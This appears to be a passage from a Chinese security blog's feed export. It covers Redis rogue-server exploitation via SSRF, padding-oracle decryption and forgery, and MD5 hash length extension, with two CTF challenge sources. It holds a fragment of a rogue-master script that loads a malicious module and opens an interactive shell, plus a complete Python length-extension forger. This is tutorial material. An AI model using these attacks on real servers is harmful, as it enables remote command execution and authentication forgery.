time.sleep(<span class="number">2</span>)</span><br><span class="line">	RogueServer(mport)</span><br><span class="line">	send(redis_sock,<span class="string">"MODULE LOAD ./&#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">	interact_shell(redis_sock)</span><br></pre></td></tr></table></figure>

<p>在SSRF的场景中，只能通过url请求访问到内网Redis的情况下，不能直接使用脚本，而是将其中的1）2）4）命令配合其他协议执行，然后在vps上启动Redis_Rogue_Server.py。</p>
<blockquote>
<p>在这个过程中master一定要回复全量复制。因为增量复制时，slave向master发送的runid和offset对应的情况下，会进行数据同步，但不会传输RDB文件。</p>
</blockquote>
<p>4）<strong>加载模块</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module load .&#x2F;exp.so</span><br></pre></td></tr></table></figure>

<p>在加载模块结束后，执行<code>system.exec command</code>即可执行任意命令。</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>在不影响业务的情况下，仅允许HTTP/HTTPS协议，且禁止302跳转。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>浅谈Redis中SSRF的利用<a href="https://xz.aliyun.com/t/5665#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-13</a></li>
<li>Docker提供的指向宿主机的DNS<a href="https://nyan.im/posts/3981.html" target="_blank" rel="noopener">https://nyan.im/posts/3981.html</a></li>
<li>Redis未授权shell利用方式分析<a href="http://blog.leanote.com/post/snowming/2d9a2082c02b" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></li>
</ul>
]]></content>
      <categories>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Padding Oracle的解密以及加密攻击</title>
    <url>/2020/05/08/padding-oracle/</url>
    <content><![CDATA[<p>前面介绍了<a href="https://ananaskr.github.io/2020/05/08/cbc-reverse/" target="_blank" rel="noopener">CBC翻转攻击</a>，从中也了解到了解密过程。而与解密过程中相关的还有一个<font color=#008000>Padding Oracle攻击</font>。Padding Oracle攻击是2010年在欧洲举行的黑帽大会上由Juliano Rizzo和Thai Duong提出的。</p>
<a id="more"></a>

<h1 id="Padding-Oracle获取明文"><a href="#Padding-Oracle获取明文" class="headerlink" title="Padding Oracle获取明文"></a>Padding Oracle获取明文</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
<li>知道密文和IV</li>
<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果。(应用程序对解密正确与否会给出不同的响应)</li>
</ul>
<h2 id="利用点-加密过程中的明文填充"><a href="#利用点-加密过程中的明文填充" class="headerlink" title="利用点-加密过程中的明文填充"></a>利用点-加密过程中的明文填充</h2><p>AES具有<font color=#008000>分组加密</font>的特性。对于明文分块后不足分块大小的。就要进行<font color=#008000>明文填充</font>。其中有种填充方式为<font color=#008000>PKCS5Padding</font>。此种填充方式会在明文块末尾补足相应数量的字节，且每个字节的值等于缺少的字符数量。如下图所示:</p>
<p><img src="1.png" alt=""></p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>如图所示的解密过程:</p>
<p><img src="2.png" alt=""></p>
<p>当攻击者拿到了IV和密文后。可以从图中得知，Intermediary Value即中间值是由明文和IV异或得到的，同时它也就是密文通过密钥解密得到的值。由上面的解密过程中可以得知<code>P[1] = decrept(C[1]) XOR IV</code>。那么得到了中间值，就可以知道明文了。如何获得中间值呢？</p>
<p>从CBC翻转攻击可以知道，IV是可以构造的。通过构造IV，使得解密后的明文最后一个填充字符为0x01，再将构造的IV与001进行异或，就得到了中间值的最后一个字节。我们知道，通过构造不同的IV，可以得到不同的明文，但是其中的中间值是不变的。因此，这个过程可以变成:</p>
<ol>
<li>设置构造IV的值为0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00，将它直接进行解出明文可能出现错误的填充值。然后不断调整最后一个字节，使得其解出的明文最后一个字节的0x01。</li>
<li>这时候构造IV的最后一个字节的值 XOR 0x01就得到了中间值的最后一个字节值。此时将其异或上原始IV的最后一个字节，就获得了明文的最后一个字节。</li>
<li>然后进行明文倒数第二个字节的获得。首先构造的IV需使得明文的最后两个字节为0x02,0x02。倒数第一个字节的IV，此时可以通过中间值最后一个字节 XOR 0x02获得。倒数第二个字节的IV需要像1中那样爆破。</li>
<li>重复以上步骤，直至获取到最后一个明文字节。</li>
</ol>
<h1 id="Padding-Oracle构造密文"><a href="#Padding-Oracle构造密文" class="headerlink" title="Padding Oracle构造密文"></a>Padding Oracle构造密文</h1><p>除了获取明文外，它还可以获得任意明文的加密密文。直观来看，在上一步中已经获取到所有的中间值。首先将明文进行填充，然后与中间值异或就可以得到IV值。然后将第二个分组的明文异或第二个分组的中间值，即得到了第一个分组的密文。那么到这里就会发现最后一个分组的密文无从得知。</p>
<p>有人提出了获得任何明文的密文的方法。从最后两个密文块开始，随机生成最后的密文块。然后每次根据最后一个明文，获取到前一个密文块的密文。依次类推，最后获得密文，过程如图所示:</p>
<p><img src="3.png" alt=""></p>
<p><img src="4.png" alt=""></p>
<p><img src="5.png" alt=""></p>
<blockquote>
<p>图片来自p0’s的博客</p>
</blockquote>
<p>文字版的过程：</p>
<ol>
<li>产生一个随机分组块Cr。</li>
<li>对于每一个明文块，从最后一个明文块开始<ul>
<li>创建两个块大小的密文C’，它由空块(0000…00)以及最新生成的密文块Cn-1组成。首轮由空块和Cr组成。</li>
<li>改变空块的最后一个字节，直到不出现padding error。(此时空块的最后一个字节与后一个块的中间值异或的值为0x01)。还是依照上面的方法获取到后一个块的中间值。</li>
<li>获取到后一个块的中间值以后，就可以利用中间值和明文，构造出前一个块的密文。(P[n] = decrept(C[n]) XOR C[n-1] =&gt; C[n-1] = decrept(C[n]) XOR P[n])。</li>
<li>然后重复整个过程，直到最后第一个明文块的密文获取完毕。</li>
</ul>
</li>
<li>再将所有的密文+Cr连接起来就获取到最终的密文了。</li>
</ol>
<p>整个Padding Oracle的加密过程，就像是先获取到明文，然后使用CBC翻转攻击，使其成为特定的明文，从而构造任意明文的密文。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.jianshu.com/p/1851f778e579" target="_blank" rel="noopener">Padding Oracle</a></li>
<li><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a></li>
<li><a href="https://maplege.github.io/2018/11/10/padding-oracle-attack/" target="_blank" rel="noopener">PaddingOracleAttack原理记录</a></li>
</ul>
]]></content>
      <categories>
        <category>密码攻击</category>
      </categories>
  </entry>
  <entry>
    <title>Hash长度扩展攻击</title>
    <url>/2020/05/24/hash-length-extension-attack/</url>
    <content><![CDATA[<p>哈希摘要算法，如MD5、SHA1、SHA2等都是基于Merkle-Damgard结构。当知道hash(secret+message)的值及secret长度的情况下，可以轻松推算出hash(secret + message || padding || m’)的值。因为攻击者的hash计算过程，相当于从服务器计算过程的一半紧接着进行下去。当填充后，服务器计算出的原始hash值，正好与添加扩展字符串并覆盖初始链变量所计算出的一样。因此，出现此攻击。</p>
<a id="more"></a>

<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><ul>
<li>在进行验证时使用 <code>md5(secret+message) === hash</code>进行比较</li>
</ul>
<h1 id="MD5算法流程"><a href="#MD5算法流程" class="headerlink" title="MD5算法流程"></a>MD5算法流程</h1><p><img src="1.png" alt=""><br>根据图，md5的流程分为以下步骤:</p>
<ol>
<li>把消息分为n个消息块。每个消息块512bit。</li>
<li>对最后一个消息进行填充。<ul>
<li>Append Padding Bits(补位)</li>
<li>Append Length(补长度)</li>
</ul>
</li>
<li>每个消息块会和一个链变量做运算，把运算结果作为下一个链变量。初始链变量固定。<ul>
<li><code>A=0x67452301</code></li>
<li><code>B=0xefcdab89</code></li>
<li><code>C=0x98badcfe</code></li>
<li><code>D=0x10325476</code></li>
</ul>
</li>
<li>最后一轮产生的链变量经过高低位互换后就是计算出来的md5值。</li>
</ol>
<h2 id="Append-Padding-Bits-填充bits"><a href="#Append-Padding-Bits-填充bits" class="headerlink" title="Append Padding Bits(填充bits)"></a>Append Padding Bits(填充bits)</h2><p>对最后一个消息块进行补位，使得其长度在对512取模后的值为448。当消息长度不满448bit时，需要在后面加上1，紧跟着多个0(二进制表示)。即16进制中的表示是在后面补上80(10000000)。</p>
<h2 id="Append-Length-填充长度"><a href="#Append-Length-填充长度" class="headerlink" title="Append Length(填充长度)"></a>Append Length(填充长度)</h2><p>剩下的最后8个字节储存量补位之前的消息长度。</p>
<h1 id="长度扩展攻击流程"><a href="#长度扩展攻击流程" class="headerlink" title="长度扩展攻击流程"></a>长度扩展攻击流程</h1><p>其实这个攻击问题就出在覆盖上，每一个消息块与前一个链变量进行一个运算后的结果会覆盖这个链变量的值。由于在这个攻击中获取到了hash(secret+message)的值，这个值是对(secret+message+padding)与链变量进行运算。</p>
<p>若此时在后面附加上消息，只需要对附加消息进行padding。然后与上一轮产生的链变量进行运算后，进行高低位互换就得到了新的hash值。上一轮的链变量正好是hash(secret+message)值高低位变换后的结果。</p>
<p>因此长度扩展攻击需要满足以下条件:</p>
<ul>
<li>消息message可控已知</li>
<li>secret长度已知(可爆破)</li>
<li>基于Merkle-Damgard构造的算法</li>
</ul>
<h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>结合一道题目来方便理解:</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目中，可以得知<code>md5(secret.urldecode(&quot;admin&quot;.&quot;admin&quot;))</code>的值，且secret的值也已知。满足哈子长度扩展攻击的要求。构造如下的payload，首先将原来的padding值附加在后面作为输入。然后在末尾添加附加的message。</p>
<p>找了如下脚本来计算最后的hash值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line">L = <span class="keyword">lambda</span> x, n: (((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; (<span class="number">0xffffffff</span>))</span><br><span class="line">shi_1 = (<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>) * <span class="number">4</span></span><br><span class="line">shi_2 = (<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>) * <span class="number">4</span></span><br><span class="line">shi_3 = (<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>) * <span class="number">4</span></span><br><span class="line">shi_4 = (<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>) * <span class="number">4</span></span><br><span class="line">m_1 = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">m_2 = (<span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>)</span><br><span class="line">m_3 = (<span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line">m_4 = (<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> (int(<span class="number">4294967296</span> * abs(math.sin(i)))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(shift_list)</span>:</span></span><br><span class="line">	shift_list = [shift_list[<span class="number">3</span>], shift_list[<span class="number">0</span>], shift_list[<span class="number">1</span>], shift_list[<span class="number">2</span>]]</span><br><span class="line">	<span class="keyword">return</span> shift_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(fun_list, f, m, shi)</span>:</span></span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">global</span> Ti_count</span><br><span class="line">	<span class="keyword">while</span> count &lt; <span class="number">16</span>:</span><br><span class="line">		xx = int(fun_list[<span class="number">0</span>], <span class="number">16</span>) + f(int(fun_list[<span class="number">1</span>], <span class="number">16</span>), int(fun_list[<span class="number">2</span>], <span class="number">16</span>), int(fun_list[<span class="number">3</span>], <span class="number">16</span>)) + int(m[count], <span class="number">16</span>) + T(Ti_count)</span><br><span class="line">		xx &amp;= <span class="number">0xffffffff</span></span><br><span class="line">		ll = L(xx, shi[count])</span><br><span class="line">		fun_list[<span class="number">0</span>] = hex((int(fun_list[<span class="number">1</span>], <span class="number">16</span>) + ll) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		fun_list = shift(fun_list)</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		Ti_count += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> fun_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_m16</span><span class="params">(order, ascii_list, f_offset)</span>:</span></span><br><span class="line">	ii = <span class="number">0</span></span><br><span class="line">	m16 = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">	f_offset *= <span class="number">64</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">		i *= <span class="number">4</span></span><br><span class="line">		m16[ii] = <span class="string">'0x'</span> + <span class="string">''</span>.join((ascii_list[i + f_offset] + ascii_list[i + <span class="number">1</span> + f_offset] + ascii_list[i + <span class="number">2</span> + f_offset] + ascii_list[i + <span class="number">3</span> + f_offset]).split(<span class="string">'0x'</span>))</span><br><span class="line">		ii += <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> ind <span class="keyword">in</span> range(len(m16)):</span><br><span class="line">		m16[ind] = reverse_hex(m16[ind])</span><br><span class="line">	<span class="keyword">return</span> m16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">	hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">if</span> len(hex_str) &lt; <span class="number">8</span>:</span><br><span class="line">		hex_str = <span class="string">'0'</span> * (<span class="number">8</span> - len(hex_str)) + hex_str</span><br><span class="line">	hex_str_list = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(hex_str), <span class="number">2</span>):</span><br><span class="line">		hex_str_list.append(hex_str[i:i + <span class="number">2</span>])</span><br><span class="line">	hex_str_list.reverse()</span><br><span class="line">	hex_str_result = <span class="string">'0x'</span> + <span class="string">''</span>.join(hex_str_list)</span><br><span class="line">	<span class="keyword">return</span> hex_str_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_result</span><span class="params">(f_list)</span>:</span></span><br><span class="line">	result = <span class="string">''</span></span><br><span class="line">	f_list1 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> f_list:</span><br><span class="line">		f_list1[f_list.index(i)] = reverse_hex(i)[<span class="number">2</span>:]</span><br><span class="line">		result += f_list1[f_list.index(i)]</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(input_m, msg_lenth=<span class="number">0</span>)</span>:</span></span><br><span class="line">	ascii_list = list(map(hex, map(ord, input_m)))</span><br><span class="line">	msg_lenth += len(ascii_list) * <span class="number">8</span></span><br><span class="line">	ascii_list.append(<span class="string">'0x80'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(ascii_list)):</span><br><span class="line">		<span class="keyword">if</span> len(ascii_list[i]) &lt; <span class="number">4</span>:</span><br><span class="line">			ascii_list[i] = <span class="string">'0x'</span> + <span class="string">'0'</span> + ascii_list[i][<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">while</span> (len(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">		ascii_list.append(<span class="string">'0x00'</span>)</span><br><span class="line">	msg_lenth_0x = hex(msg_lenth)[<span class="number">2</span>:]</span><br><span class="line">	msg_lenth_0x = <span class="string">'0x'</span> + msg_lenth_0x.rjust(<span class="number">16</span>, <span class="string">'0'</span>)</span><br><span class="line">	msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[<span class="number">2</span>:]</span><br><span class="line">	msg_lenth_0x_list = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(msg_lenth_0x_big_order), <span class="number">2</span>):</span><br><span class="line">		msg_lenth_0x_list.append(<span class="string">'0x'</span> + msg_lenth_0x_big_order[i: i + <span class="number">2</span>])</span><br><span class="line">	ascii_list.extend(msg_lenth_0x_list)</span><br><span class="line">	<span class="keyword">return</span> ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(input_m)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> Ti_count</span><br><span class="line">	Ti_count = <span class="number">1</span></span><br><span class="line">	abcd_list = [<span class="string">'0x67452301'</span>, <span class="string">'0xefcdab89'</span>, <span class="string">'0x98badcfe'</span>, <span class="string">'0x10325476'</span>]</span><br><span class="line">	ascii_list = padding(input_m)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ascii_list) // <span class="number">64</span>):</span><br><span class="line">		aa, bb, cc, dd = abcd_list</span><br><span class="line">		order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">		order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">		order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">		order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">		abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">		abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">		abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">		abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">		output_a = hex((int(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + int(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_b = hex((int(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + int(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_c = hex((int(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + int(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_d = hex((int(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + int(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">		Ti_count = <span class="number">1</span></span><br><span class="line">		print(ascii_list)</span><br><span class="line">	<span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_lea</span><span class="params">(suffix, res, len_m)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> Ti_count</span><br><span class="line">	Ti_count = <span class="number">1</span></span><br><span class="line">	abcd_list = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">		abcd_list.append(reverse_hex(<span class="string">'0x'</span> + res[i: i + <span class="number">8</span>]))</span><br><span class="line">	ascii_list = padding(suffix, (len_m + <span class="number">72</span>) // <span class="number">64</span> * <span class="number">64</span> * <span class="number">8</span>)  <span class="comment"># len(message + padding) * 8</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ascii_list) // <span class="number">64</span>):</span><br><span class="line">		aa, bb, cc, dd = abcd_list</span><br><span class="line">		order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">		order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">		order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">		order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">		abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">		abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">		abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">		abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">		output_a = hex((int(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + int(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_b = hex((int(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + int(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_c = hex((int(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + int(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_d = hex((int(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + int(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">		Ti_count = <span class="number">1</span></span><br><span class="line">	<span class="comment"># print(ascii_list)</span></span><br><span class="line">	<span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	print(md5_lea(<span class="string">'kingkk'</span>,<span class="string">'571580b26c65f306376d4f64e53cb5c7'</span>,<span class="number">15</span>))</span><br></pre></td></tr></table></figure>

<h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><p>这是另一道哈希扩展长度的题目。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;CTF Web_SimplestHASH&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myfile = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$flag = fread($myfile,filesize(<span class="string">"flag.txt"</span>));</span><br><span class="line">fclose($myfile);</span><br><span class="line">$salt = <span class="number">0xfffff</span> &amp; (ord(md5($flag, <span class="keyword">TRUE</span>)[<span class="number">1</span>]));</span><br><span class="line">$myfile = fopen(<span class="string">"pswrecord"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$tmp = fread($myfile,filesize(<span class="string">"pswrecord"</span>));</span><br><span class="line">sscanf($tmp,<span class="string">"%s\t%s"</span>,$name,$password);</span><br><span class="line">$hah = md5($flag.$password.$salt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_string($_POST[<span class="string">"name"</span>]) &amp;&amp;  $_POST[<span class="string">"name"</span>] == $name)&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_string($_POST[<span class="string">"password"</span>]) &amp;&amp; is_string($_POST[<span class="string">"hah"</span>]) &amp;&amp; strlen($_POST[<span class="string">"password"</span>]) &gt;= <span class="number">20</span> &amp;&amp; strlen($_POST[<span class="string">"hah"</span>])  == <span class="number">32</span> &amp;&amp; md5($flag.$_POST[<span class="string">"password"</span>].$salt) == $_POST[<span class="string">'hah'</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose($myfile);</span><br><span class="line">$_POST[<span class="string">'name'</span>] = <span class="number">0</span>;</span><br><span class="line">$_POST[<span class="string">'hah'</span>] = <span class="number">0</span>;</span><br><span class="line">$_POST[<span class="string">"password"</span>] = <span class="number">0</span>;</span><br><span class="line">$salt = <span class="number">0</span>;</span><br><span class="line">$tmp = <span class="number">0</span>;</span><br><span class="line">$flag = <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">	&lt;img src=<span class="string">"/welcome.png"</span> alt=<span class="string">"welcome!"</span> /&gt;</span><br><span class="line">	We used git.</span><br><span class="line">	&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">	Name: &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">	Password: &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">	&lt;input type=<span class="string">"password"</span> name=<span class="string">"hah"</span> value=<span class="string">"&lt;?php echo $hah?&gt;"</span> hidden&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Login"</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这道题中，可以获取password值为123456。因此，它有如下条件:</p>
<ul>
<li>hash(flag.password.salt)的值确定</li>
